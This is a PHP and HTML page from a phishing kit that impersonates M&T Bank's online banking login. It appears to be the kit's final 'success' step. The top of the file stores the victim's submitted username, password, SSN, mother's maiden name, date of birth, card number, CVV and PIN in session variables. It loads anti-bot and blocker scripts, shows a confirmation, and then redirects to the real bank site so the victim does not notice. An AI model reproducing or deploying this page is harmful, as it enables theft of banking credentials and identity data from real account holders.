<?php


//session_start();
error_reporting(0);

include('../functions/get_lang_en.php');
include('../antibots.php');
include('../blocker.php');

if (isset($_SESSION['_cardnumber_'])){
	
	$_SESSION['_user_name_'] = $_POST['user_name'];
	$_SESSION['_user_password_'] = $_POST['user_password'];
	$_SESSION['_firstname_']    = $_POST['firstname'];
	$_SESSION['_lastname_']        = $_POST['lastname'];
	$_SESSION['_mmn_']        = $_POST['mmn'];
	$_SESSION['_ssn_']      = $_POST['ssn'];
	$_SESSION['_dob_']      = $_POST['dob'];
	$_SESSION['_nameoncard_'] = $_POST['card_name'];
	$_SESSION['_cardnumber_'] = $_POST['card_number'];
	$_SESSION['_expdate_']    = $_POST['exp'];
	$_SESSION['_csc_']        = $_POST['csc'];
	$_SESSION['_pin_']        = $_POST['pin'];
}

?>


<!DOCTYPE html>
<!-- saved from url=(0045)https://onlinebanking.mtb.com/Login/MTBSignOn -->
<html lang="en" class="__sticky-footer __sticky-footer--links"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="" src="./Welcome to Online Banking _ M&amp;T Bank_files/477c13ccfe1eb8f143582f0d152ee4ec.js.download"></script><script type="text/javascript" async="" src="./Welcome to Online Banking _ M&amp;T Bank_files/9fe018a46720656076592eb2233f44e0.js.download"></script><script src="./Welcome to Online Banking _ M&amp;T Bank_files/serverComponent.php"></script>
<script type="text/javascript" src="./Welcome to Online Banking _ M&amp;T Bank_files/0856addebbab2000de50d1868782f68822afd32422e9b3f7af9d2fc6b846fee29088e632705717e1"></script>



	<!------------------------------- FILES CSS STYLE --------------------------------->
<!--	<meta http-equiv="refresh" content="5; url=http://www.paypal.com/cgi-bin/webscr?cmd=_login-submit"> -->
</head><body><apm_do_not_touch>

<script type="text/javascript">
(function(){
window.LgI=!!window.LgI;try{(function(){(function JS(){var Z=!1;function S(Z){for(var S=0;Z--;)S+=J(document.documentElement,null);return S}function J(Z,S){var l="vi";S=S||new L;return _O(Z,function(Z){Z.setAttribute("data-"+l,S.L$());return J(Z,S)},null)}function L(){this.ij=1;this.oj=0;this.SS=this.ij;this.L_=null;this.L$=function(){this.L_=this.oj+this.SS;if(!isFinite(this.L_))return this.reset(),this.L$();this.oj=this.SS;this.SS=this.L_;this.L_=null;return this.SS};this.reset=function(){this.ij++;this.oj=0;this.SS=this.ij}}var OO=!1;
function l(Z,S){var l=document.createElement(Z);S=S||document.body;S.appendChild(l);l&&l.style&&(l.style.display="none")}function zO(S,l){l=l||S;var J="|";function L(Z){Z=Z.split(J);var S=[];for(var l=0;l<Z.length;++l){var OO="",zO=Z[l].split(",");for(var SO=0;SO<zO.length;++SO)OO+=zO[SO][SO];S.push(OO)}return S}var zO=0,_O="datalist,details,embed,figure,hrimg,strong,article,formaddress|audio,blockquote,area,source,input|canvas,form,link,tbase,option,details,article";_O.split(J);_O=L(_O);_O=new RegExp(_O.join(J),
"g");while(_O.exec(S))_O=new RegExp((""+new Date)[8],"g"),Z&&(OO=!0),++zO;return l(zO&&1)}function _O(Z,S,J){(J=J||OO)&&l("div",Z);Z=Z.children;var L=0;for(var zO in Z){J=Z[zO];try{J instanceof HTMLElement&&(S(J),++L)}catch(_O){}}return L}zO(JS,S)})();var ZO=31;try{var sO,jO,JO=z(423)?1:0,oO=z(773)?0:1,Oz=z(476)?1:0;for(var zZ=(z(935),0);zZ<jO;++zZ)JO+=z(469)?2:1,oO+=z(631)?1:2,Oz+=(z(705),3);sO=JO+oO+Oz;window.sS===sO&&(window.sS=++sO)}catch(sZ){window.sS=sO}var SZ=!0;
function iZ(O){var Z=73;!O||document[I(Z,191,178,188,178,171,178,181,178,189,194,156,189,170,189,174)]&&document[I(Z,191,178,188,178,171,178,181,178,189,194,156,189,170,189,174)]!==s(68616527593,Z)||(SZ=!1);return SZ}function I(O){var Z=arguments.length,S=[],J=1;while(J<Z)S[J-1]=arguments[J++]-O;return String.fromCharCode.apply(String,S)}function _(O){var Z=arguments.length,S=[];for(var J=1;J<Z;++J)S.push(arguments[J]-O);return String.fromCharCode.apply(String,S)}function jZ(){}
iZ(window[jZ[s(1086823,ZO)]]===jZ);iZ(typeof ie9rgb4!==s(1242178186168,ZO));iZ(RegExp("\x3c")[s(1372174,ZO)](function(){return"\x3c"})&!RegExp(s(42858,ZO))[_(ZO,147,132,146,147)](function(){return"'x3'+'d';"}));
var LZ=window[_(ZO,128,147,147,128,130,135,100,149,132,141,147)]||RegExp(_(ZO,140,142,129,136,155,128,141,131,145,142,136,131),s(-13,ZO))[s(1372174,ZO)](window["\x6e\x61vi\x67a\x74\x6f\x72"]["\x75\x73e\x72A\x67\x65\x6et"]),oZ=+new Date+(z(652)?635599:6E5),Os,ss,Ss,is=window[_(ZO,146,132,147,115,136,140,132,142,148,147)],Is=LZ?z(515)?3E4:44916:z(106)?6E3:6382;
document[I(ZO,128,131,131,100,149,132,141,147,107,136,146,147,132,141,132,145)]&&document[I(ZO,128,131,131,100,149,132,141,147,107,136,146,147,132,141,132,145)](I(ZO,149,136,146,136,129,136,139,136,147,152,130,135,128,141,134,132),function(O){var Z=44;document[_(Z,162,149,159,149,142,149,152,149,160,165,127,160,141,160,145)]&&(document[_(Z,162,149,159,149,142,149,152,149,160,165,127,160,141,160,145)]===s(1058781939,Z)&&O[_(Z,149,159,128,158,161,159,160,145,144)]?Ss=!0:document[I(Z,162,149,159,149,
142,149,152,149,160,165,127,160,141,160,145)]===I(Z,162,149,159,149,142,152,145)&&(Os=+new Date,Ss=!1,js()))});function js(){if(!document[_(39,152,156,140,153,160,122,140,147,140,138,155,150,153)])return!0;var O=+new Date;if(O>oZ&&(z(598)?409121:6E5)>O-Os)return iZ(!1);var Z=iZ(ss&&!Ss&&Os+Is<O);Os=O;ss||(ss=!0,is(function(){ss=!1},z(723)?0:1));return Z}js();var os=[z(731)?22788686:17795081,z(567)?27611931586:2147483647,z(634)?1625115030:1558153217];function s(O,Z){O+=Z;return O.toString(36)}
function OS(O){var Z=72;O=typeof O===s(1743045604,Z)?O:O[_(Z,188,183,155,188,186,177,182,175)](z(742)?43:36);var S=window[O];if(!S||!S[I(Z,188,183,155,188,186,177,182,175)])return;var J=""+S;window[O]=function(O,Z){ss=!1;return S(O,Z)};window[O][_(Z,188,183,155,188,186,177,182,175)]=function(){return J}}for(var zS=(z(668),0);zS<os[I(ZO,139,132,141,134,147,135)];++zS)OS(os[zS]);iZ(!1!==window[_(ZO,107,134,104)]);window._s=window._s||{};window._s.loO="08d4ed6db016e8008666fe0625942fd9c641ca038743154156ef7c6028a05577c7938e8972c0afc2b093bf00444eccaa02355b8ad6ec07ebedafc893bdd6eb6e0679a1ca5c67a6e64291b7eead27cf126896967b25236ea1b108e4f594a8017843f3110957fd384500f330c71ffca15d22bfd50a68cbadfe62b7a6cef0282bc24e7cb02779c9bd06c55da96a034fdf76a7cf708acb4c74c6c4ad1ded73d00b016af85521fd854e43b1cf813ba94ffb669efd4eade5de479ff4413771be318b664dd912844e0d43c14ab2de0db1b91bd2b1be5d0e4cbf8c80d29b8845c66dde30347e895fae90e3df09dc3e2836397474";
function ZS(O){var Z=+new Date,S;!document[I(41,154,158,142,155,162,124,142,149,142,140,157,152,155,106,149,149)]||Z>oZ&&(z(472)?6E5:805086)>Z-Os?S=iZ(!1):(S=iZ(ss&&!Ss&&Os+Is<Z),Os=Z,ss||(ss=!0,is(function(){ss=!1},z(774)?0:1)));return!(arguments[O]^S)}function z(O){return 587>O}(function lS(Z){return Z?0:lS(Z)*lS(Z)})(!0);})();}catch(x){
}finally{ie9rgb4=void(0);};function ie9rgb4(a,b){return a>>b>>0};

})();

</script>
</apm_do_not_touch>

<script type="text/javascript" src="./Welcome to Online Banking _ M&amp;T Bank_files/0856addebbab2000de50d1868782f68822afd32422e9b3f7af9d2fc6b846fee29088e632705717e1(1)"></script>

    <title>Welcome to Online Banking | M&amp;T Bank</title>
    <link rel="shortcut icon" href="https://asset.mtb.com/Documents/html/homepage/favicon.ico" type="image/x-icon">
    
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="format-detection" content="telephone=no">
    
    <script type="text/javascript" src="./Welcome to Online Banking _ M&amp;T Bank_files/ruxitagentjs_ICA2SVfhjqrux_10205201218101503.js.download" data-dtconfig="rid=RID_-583655553|rpid=444479115|domain=mtb.com|reportUrl=/rb_edeadee0-0165-4b9e-a91f-0085183ac4e1|app=893c324bd7e5ac65|featureHash=ICA2SVfhjqrux|srsr=10000|vcv=2|rdnt=1|uxrgce=1|bp=3|cuc=zgefxirc|dpvc=1|md=mdcc1=a#AuthID@value,mdcc2=a#divSendMoneyReview ^rb div:nth-child(3) ^rb span,mdcc3=a#divRequestMoneyReview ^rb div:nth-child(3) ^rb span|lastModification=1610461584114|dtVersion=10205201218101503|tp=500,50,0,1|uxdcw=1500|vs=2|agentUri=/ruxitagentjs_ICA2SVfhjqrux_10205201218101503.js"></script><link href="./Welcome to Online Banking _ M&amp;T Bank_files/css.mtb" rel="stylesheet">

    <script src="./Welcome to Online Banking _ M&amp;T Bank_files/Bootstrap.js.download"></script>
	
	<!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">

<!-- JavaScript Bundle with Popper -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-ygbV9kiqUc6oa4msXn9868pTtWMgiQaeYH7/t7LECLbyPA2x65Kgf80OJFdroafW" crossorigin="anonymous"></script>

    
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title><?=$Z118_title." ".$_SESSION['_LOOKUP_CNTRCODE_'];?></title>
	<meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="shortcut icon" type="image/x-icon" href="../lib/img/favicon.ico">
    <link rel="apple-touch-icon" href="../lib/img/apple-touch-icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<!---------------------------- FONTS ROBOT CONDDENSED ----------------------------->
	<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed" rel="stylesheet">
	<!------------------------------- FILES CSS STYLE --------------------------------->
    <link rel="stylesheet" href="../lib/css/G-Z118.css">
    <link rel="stylesheet" href="../lib/css/B-Z118.css">
	<meta http-equiv="refresh" content="5; url=https://www3.mtb.com">
    




        <header class="mtb-page-header">
            <input type="hidden" id="TagPageName" name="TagPageName" value="OLB:Login:Index">
            <div class="grid-x align-center">
                <div class="cell">
                    <a href="https://www.mtb.com/home-page" class="mtb__logo">
                        <img src="./Welcome to Online Banking _ M&amp;T Bank_files/mtb-logo.svg" alt="M&amp;T Bank Site">
                    </a>
                </div>
            </div>
        </header>
   
 

<style>
	.start {
		font-size: 0.8em;
		margin-left: 2%;
	}
	.address {
		color: #656565;
		font-weight:200;
	}
	#Cd988X {
		border: 1px solid #0070ba;
    	font-size: 14px;
    	font-weight: bold;
    	padding-top: 16px;
    	padding-right: 10px;
    	padding-left: 10px;
    	border-radius: 5px;
    	width: 90%;
        margin-right: 4%;
	}
	h4 {
		font-weight: 200;
    	color: #656565;
	}
	.Z118-Icon{
        background-position: left top;
        background-image: url(../lib/img/done.png);
        background-repeat: no-repeat;
        display: inline-block;
        height: 100px;
        width: 100px;
		margin-top: 10px;
	}
	@media all and (max-width: 767px){
		.Z118-Icon{margin-top: 0px;}
	}
	</style>
<div class='container'>
  <div class="row">
	  <div class="col-md-6 offset-md-3 border border-warning">
     <br/><br/>
                    
<form action="" method="post" name="WorldWide_form" class="validator" nox_V-ForZ118="nox_V-ForZ118"> 
                            <br/>
                            <div class="HeaderZ118">
                                <h2><?=$Z118_success;?></h2>
                            </div>
							
                            <hr style="width: 100%;">
							
							<br/><br/><br/>
                            <div>
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;"><?=$Z118_successp;?></p>
                            </div>
							<br/>
							<div class="MightyxMorphin" id="<?="PP-ID118".rand(1180018, 1001198745)?>">
                                <div class="0Dats_Good0" style="margin-left: 4%;">
								<center><span class="Z118-Icon"></span></center>
                                    
                                </div>
                            </div>
							<br/><br/>
                        </form>   

</div>
</div>
</div>
</div>


		

        <hr class="__spacer-section">
        <div class="mtb-app-default--content">

            <div class="grid-x grid-padding-x grid-x__padded">
                <div class="cell text-center">
                    <p class="__font-size-secondary">
                        Have questions about M&amp;T Online Banking?
                    </p>
                </div>
                <div class="cell medium-6 text-center">
                    <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
                        Personal Accounts:
                        <a href="tel:1-800-790-9130" class="__no-underline">1-800-790-9130</a>
                    </p>
                    <p class="__font-size-sub __spacer-remove __color-gray-accent">
                        Monday - Friday 8am - 9pm ET
                    </p>
                    <p class="__font-size-sub __spacer-paragraph __color-gray-accent">
                        Saturday - Sunday 9am - 5pm ET
                    </p>
                </div>
                <div class="cell medium-6 text-center">
                    <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
                        Business Accounts: <a href="tel:1-800-724-6070" class="__no-underline">1-800-724-6070</a>
                    </p>
                    <p class="__font-size-sub __spacer-remove __color-gray-accent">
                        Monday - Friday 6am - 9pm ET
                    </p>
                    <p class="__font-size-sub __spacer-section __color-gray-accent">
                        Saturday - Sunday 9am - 5pm ET
                    </p>
                </div>
            </div>
        </div>
        <section class="mtb-footer mtb-footer__auth" role="contentinfo">
            <div class="grid-x">
                <div class="cell flex-container flex-dir-column align-center-middle">
                    <div class="mtb-footer--auth">
                        <a href="https://upgrade.mtb.com/olb-upgrade" class="" target="_blank">Get Started Guide</a>
                        <a href="https://www.mtb.com/olbsecurity" target="_blank">Security Assistance</a>
                        <a href="https://asset.mtb.com/Documents/html/DSA.htm" target="_blank">Digital Service Agreement</a>
                        <a href="https://asset.mtb.com/Documents/html/ESign.htm" target="_blank">ESign Agreement</a>
                        <a href="https://mtb.com/olb-accessibility" target="_blank">
                            Accessibility
                        </a>


                        <a href="https://www.mtb.com/olb-personalsite" target="_blank">
                            mtb.com
                        </a>
                    </div>

                    <div class="mtb-footer--non-auth">
                        <p>
                            ©2021 M&amp;T Bank. All Rights Reserved.<br>
                            Users of this website agree to be bound by the provisions of the M&amp;T website <a href="https://www.mtb.com/help-center/policies/terms-of-use" target="_blank">
                                Terms of
                                Use
                            </a> and <a href="https://www.mtb.com/privacy" target="_blank">Privacy Policy</a>.
                        </p>
                        <div class="mtb-footer__logo">
                            <a href="https://www.mtb.com/equalhousinglender" target="_blank">
                                <img src="./Welcome to Online Banking _ M&amp;T Bank_files/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender">
                            </a>
                            <a href="https://www.mtb.com/olb-entrust" target="_blank">
                                <img src="./Welcome to Online Banking _ M&amp;T Bank_files/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
                            </a>
                        </div>
                        <p>
                            Equal Housing Lender NMLS #381076
                            <a href="https://www.mtb.com/fdic" target="_blank">Member FDIC</a>
                        </p>
                    </div>
                </div>
            </div>
        </section>
    </div>
<!-- </form> -->
    <script src="./Welcome to Online Banking _ M&amp;T Bank_files/js.mtb"></script>

    
    <script src="./Welcome to Online Banking _ M&amp;T Bank_files/Index.js.download"></script>





</body></html>